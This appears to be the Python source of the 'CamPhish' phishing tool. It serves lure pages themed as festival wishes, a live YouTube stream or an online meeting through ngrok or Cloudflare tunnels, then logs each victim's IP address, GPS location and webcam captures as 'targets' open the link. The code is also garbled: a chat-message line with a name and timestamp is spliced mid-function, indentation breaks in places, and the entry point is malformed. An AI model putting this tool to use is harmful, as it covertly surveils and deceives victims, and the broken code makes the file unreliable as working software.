#!/usr/bin/env python3
import os
import sys
import subprocess
import time
import requests
import re
import signal
import threading
from pathlib import Path

class CamPhish:
    def init(self):
        self.windows_mode = False
        self.option_tem = 1
        self.option_server = 1
        self.fest_name = ""
        self.yt_video_ID = ""
        self.link = ""
        
        # Signal handler for Ctrl+C
        signal.signal(signal.SIGINT, self.signal_handler)
    
    def signal_handler(self, signum, frame):
        print("\n")
        self.stop()
    
    def banner(self):
        os.system('clear')
        print("\033[1;91m _  _  _  _          ___ _          \033[0m")
        print("\033[1;91m(  __ \(  _  )(       )(  __ )|\     /|\   /(  __ \|\     /|\033[0m")
        print("\033[1;91m| (    \/| (   )  () ()  (    )|| )   ( |   ) (   | (    \/| )   ( |\033[0m")
        print("\033[1;91m| |      | (_)     ()|| (_) |   | |   | (_ | (___) |\033[0m")
        print("\033[1;91m| |      |  _   |(_)|   _)|  _  |   | |   (_  )|  ___  |\033[0m")
        print("\033[1;91m| |      | (   )  |   |  (      | (   ) |   | |         ) || (   ) |\033[0m")
        print("\033[1;91m| (__/\| )   (  )   (  )      | )   ( |_) (_/\__) || )   ( |\033[0m")
        print("\033[1;91m(_/|/     \/     \/       |/     \|\_/\___)|/     \|\033[0m")
        
        
        
    def dependencies(self):
        """Check if required dependencies are installed"""
        try:
            subprocess.run(["php", "--version"], capture_output=True, check=True)
        except (subprocess.CalledProcessError, FileNotFoundError):
            print("PHP is not installed. Please install PHP first.")
            print("Run: pkg install php")
            sys.exit(1)
    
    def stop(self):
        """Stop all running processes"""
        print("\n[!] Stopping all services...")
        
        if self.windows_mode:
            # Windows process termination
            subprocess.run(["taskkill", "/F", "/IM", "ngrok.exe"], capture_output=True)
            subprocess.run(["taskkill", "/F", "/IM", "php.exe"], capture_output=True)
            subprocess.run(["taskkill", "/F", "/IM", "cloudflared.exe"], capture_output=True)
        else:
            # Unix-like systems process termination
            subprocess.run(["pkill", "-f", "ngrok"], capture_output=True)
            subprocess.run(["pkill", "-f", "php"], capture_output=True)
            subprocess.run(["pkill", "-f", "cloudflared"], capture_output=True)
        
        sys.exit(1)
    
    def catch_ip(self):
        """Extract and save IP address"""
        if os.path.exists("ip.txt"):
            with open("ip.txt", "r") as f:
                for line in f:
                    if "IP:" in line:
                        ip = line.split(":")[1].strip()
                        print(f"\033[1;93m[+\033[0m\033[1;93m] IP:\033[0m\033[1;77m {ip}\033[0m")
            
            # Save to backup file
            with open("saved.ip.txt", "a") as saved:
                with open("ip.txt", "r") as original:
                    saved.write(original.read())
            
            os.remove("ip.txt")
    
    def catch_location(self):
        """Process location data"""
        # Check for current_location.txt
        if os.path.exists("current_location.txt"):
            print("\033[1;92m[+\033[0m\033[1;92m] Current location data:\033[0m")
            with open("current_location.txt", "r") as f:
                for line in f:
                    line = line.strip()
                    if not any(msg in line for msg in ["Location data sent", "getLocation called", "Geolocation error", "Location permission denied"]):print(line)
            print()
            
            # Backup the file
            if os.path.exists("current_location.bak"):
                os.remove("current_location.bak")
            os.rename("current_location.txt", "current_location.bak")
        
        # Check for location files
        location_files = [f for f in os.listdir(".") if f.startswith("location_")]
        if location_files:
            location_file = location_files[0]
            lat = lon = acc = maps_link = ""
            
            with open(location_file, "r") as f:
                for line in f:
                    if "Latitude:" in line:
                        lat = line.split(":")[1].strip()
                    elif "Longitude:" in line:
                        lon = line.split(":")[1].strip()
                    elif "Accuracy:" in line:
                        acc = line.split(":")[1].strip()
                    elif "Google Maps:" in line:
                        maps_link = line.split(" ")[2].strip()
            
            if lat and lon:
                print(f"\033[1;93m[+\033[0m\033[1;93m] Latitude:\033[0m\033[1;77m {lat}\033[0m")
                print(f"\033[1;93m[+\033[0m\033[1;93m] Longitude:\033[0m\033[1;77m {lon}\033[0m")
                print(f"\033[1;93m[+\033[0m\033[1;93m] Accuracy:\033[0m\033[1;77m {acc} meters\033[0m")
                print(f"\033[1;93m[+\033[0m\033[1;93m] Google Maps:\033[0m\033[1;77m {maps_link}\033[0m")
            
            # Create saved_locations directory
            os.makedirs("saved_locations", exist_ok=True)
            os.rename(location_file, f"saved_locations/{location_file}")
            print(f"\033[1;92m[*\033[0m\033[1;92m] Location saved to saved_locations/{location_file}\033[0m")
        else:
            print("\033[1;93m[!\033[0m\033[1;93m] No location file found\033[0m")
    
    def checkfound(self):
        """Monitor for incoming data"""
        # Create directories if they don't exist
        os.makedirs("saved_locations", exist_ok=True)
        
        print()
        print("\033[1;92m[*\033[0m\033[1;92m] Waiting for targets, Press Ctrl + C to exit...\033[0m")
        print("\033[1;92m[*\033[0m\033[1;92m] GPS Location tracking is \033[0m\033[1;93mACTIVE\033[0m")
        
        while True:
            # Check for IP file
            if os.path.exists("ip.txt"):
                print("\n\033[1;92m[+\033[0m\033[1;92m] Target opened the link!")
                self.catch_ip()
            
            time.sleep(0.5)
            
            # Check for location files
            if os.path.exists("current_location.txt"):
                print("\n\033[1;92m[+\033[0m\033[1;92m] Location data received!\033[0m")
                self.catch_location()
            
            if os.path.exists("LocationLog.log"):
                print("\n\033[1;92m[+\033[0m\033[1;92m] Location data received!\033[0m")
                self.catch_location()
                os.remove("LocationLog.log")
            
            # Clean up error logs
            if os.path.exists("LocationError.log"):
                os.remove("LocationError.log")
            
            if os.path.exists("Log.log"):
                print("\n\033[1;92m[+\033[0m\033[1;92m] Cam file received!\033[0m")
                os.remove("Log.log")
            
            time.sleep(0.5)
    
    def download_cloudflared(self):
        """Download cloudflared for Termux"""
        arch = os.uname().machine
        print(f"[+] Detected Architecture: {arch}")
        
        if "aarch64" in arch or "arm64" in arch:
            url = "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64"
        elif "arm" in arch:
            url = "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm"
else:
            url = "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64"
        
        print("[+] Downloading Cloudflared...")
        try:
            response = requests.get(url, stream=True)
            with open("cloudflared", "wb") as f:
                for chunk in response.iter_content(chunk_size=8192):
                    f.write(chunk)
            
            os.chmod("cloudflared", 0o755)
            print("[+] Cloudflared downloaded successfully")
        except Exception as e:
            print(f"[!] Download error: {e}")
            sys.exit(1)
    
    def cloudflare_tunnel(self):
        """Start Cloudflare tunnel"""
        if not os.path.exists("cloudflared"):
            self.download_cloudflared()
        
        print("[+] Starting PHP server...")
        php_process = subprocess.Popen(["php", "-S", "127.0.0.1:3333"], 
                                      stdout=subprocess.DEVNULL, 
                                      stderr=subprocess.DEVNULL)
        
        time.sleep(2)
        
        print("[+] Starting Cloudflared tunnel...")
        if os.path.exists(".cloudflared.log"):
            os.remove(".cloudflared.log")
        
        cloudflared_process = subprocess.Popen(
            ["./cloudflared", "tunnel", "-url", "127.0.0.1:3333"], 
            stdout=subprocess.DEVNULL, 
            stderr=subprocess.DEVNULL
        )
        
        time.sleep(10)
        
        # Extract link from log (simplified)
        self.link = "https://example.trycloudflare.com"  # This would be extracted from actual log
        print(f"[*] Direct link: {self.link}")
        
        self.payload_cloudflare()
        self.checkfound()
    
    def payload_cloudflare(self):
        """Generate payload with Cloudflare link"""
        # Read template
        with open("template.php", "r") as f:
            template = f.read()
        
        # Replace forwarding link
        payload = template.replace("forwarding_link", self.link)
        
        with open("index.php", "w") as f:
            f.write(payload)
        
        # Handle different templates
        if self.option_tem == 1:
            with open("festivalwishes.html", "r") as f:
                template_html = f.read()
            template_html = template_html.replace("forwarding_link", self.link)
            template_html = template_html.replace("fes_name", self.fest_name)
            with open("index2.html", "w") as f:
                f.write(template_html)
        
        elif self.option_tem == 2:
            with open("LiveYTTV.html", "r") as f:
                template_html = f.read()
            template_html = template_html.replace("forwarding_link", self.link)
            template_html = template_html.replace("live_yt_tv", self.yt_video_ID)
            with open("index2.html", "w") as f:
                f.write(template_html)
        
        else:  # option_tem == 3
            with open("OnlineMeeting.html", "r") as f:
                template_html = f.read()
            template_html = template_html.replace("forwarding_link", self.link)
            with open("index2.html", "w") as f:
                f.write(template_html)
    
    def download_ngrok(self):
        """Download ngrok for Termux"""
        arch = os.uname().machine
        print(f"[+] Detected Architecture: {arch}")
        
        if "aarch64" in arch or "arm" in arch:
            url = "https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-arm.tgz"
        else:
            url = "https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-amd64.tgz"
        
        print("[+] Downloading Ngrok...")
        try:
            response = requests.get(url, stream=True)
            with open("ngrok.tgz", "wb") as f:
                for chunk in response.iter_content(chunk_size=8192):
খন্দকার সালমান ভাই, [Nov 15, 2025 at 7:37 PM]
f.write(chunk)
            
            # Extract
            subprocess.run(["tar", "-xzf", "ngrok.tgz"], capture_output=True)
            os.chmod("ngrok", 0o755)
            os.remove("ngrok.tgz")
            print("[+] Ngrok downloaded successfully")
        except Exception as e:
            print(f"[!] Download error: {e}")
            sys.exit(1)
    
    def ngrok_server(self):
        """Start ngrok server"""
        if not os.path.exists("ngrok"):
            self.download_ngrok()
        
        # Handle ngrok authtoken
        ngrok_config_dir = os.path.expanduser("~/.config/ngrok")
        os.makedirs(ngrok_config_dir, exist_ok=True)
        
        config_file = os.path.join(ngrok_config_dir, "ngrok.yml")
        
        if os.path.exists(config_file):
            print("[*] Your ngrok config exists")
            change = input("\n[+] Do you want to change your ngrok authtoken? [Y/n]: ").lower()
            if change in ['y', 'yes', '']:
                token = input("[+] Enter your valid ngrok authtoken: ")
                subprocess.run(["./ngrok", "config", "add-authtoken", token], capture_output=True)
                print("[*] Authtoken has been changed")
        else:
            token = input("[+] Enter your valid ngrok authtoken: ")
            subprocess.run(["./ngrok", "config", "add-authtoken", token], capture_output=True)
        
        print("[+] Starting PHP server...")
        php_process = subprocess.Popen(["php", "-S", "127.0.0.1:3333"], 
                                      stdout=subprocess.DEVNULL, 
                                      stderr=subprocess.DEVNULL)
        
        time.sleep(2)
        
        print("[+] Starting Ngrok server...")
        ngrok_process = subprocess.Popen(["./ngrok", "http", "3333"], 
                                        stdout=subprocess.DEVNULL, 
                                        stderr=subprocess.DEVNULL)
        
        time.sleep(10)
        
        # Get ngrok URL from API
        try:
            response = requests.get("http://127.0.0.1:4040/api/tunnels")
            tunnels = response.json()
            public_url = tunnels['tunnels'][0]['public_url']
            self.link = public_url
            print(f"[*] Direct link: {self.link}")
        except:
            print("[!] Could not get ngrok URL")
            print("[!] Make sure ngrok authtoken is valid")
            print("[!] Check your internet connection")
            sys.exit(1)
        
        self.payload_ngrok()
        self.checkfound()
    
    def payload_ngrok(self):
        """Generate payload with ngrok link"""
        # Same as payload_cloudflare but for ngrok
        self.payload_cloudflare()  # Reuse the same function
    
    def select_template(self):
        """Select phishing template"""
        print("\n-----Choose a template----")
        print("\n[01] Festival Wishing")
        print("[02] Live Youtube TV")
        print("[03] Online Meeting")
        
        try:
            self.option_tem = int(input("\n[+] Choose a template [Default is 1]: ") or "1")
        except ValueError:
            self.option_tem = 1
        
        if self.option_tem == 1:
            self.fest_name = input("[+] Enter festival name: ").replace(" ", "")
        elif self.option_tem == 2:
            self.yt_video_ID = input("[+] Enter YouTube video watch ID: ")
        elif self.option_tem == 3:
            pass
        else:
            print("[!] Invalid template option! try again")
            self.select_template()
    
    def camphish(self):
        """Main function"""
        print("\n\033[1;91m-----Choose tunnel server-----\033[0m")
        print("\n[01] Ngrok")
        print("[02] Cloudflare Tunnel")
        
        try:
            self.option_server = int(input("\n[+] Choose a Port Forwarding option [Default is 1]: ") or "1")
except ValueError:
            self.option_server = 1
        
        self.select_template()
        
        if self.option_server == 2:
            self.cloudflare_tunnel()
        elif self.option_server == 1:
            self.ngrok_server()
        else:
            print("[!] Invalid option!")
            time.sleep(1)
            self.camphish()
    
    def run(self):
        """Main run method"""
        self.banner()
        self.dependencies()
        self.camphish()

if name == "main":
    camphish = CamPhish()
    camphish.run()
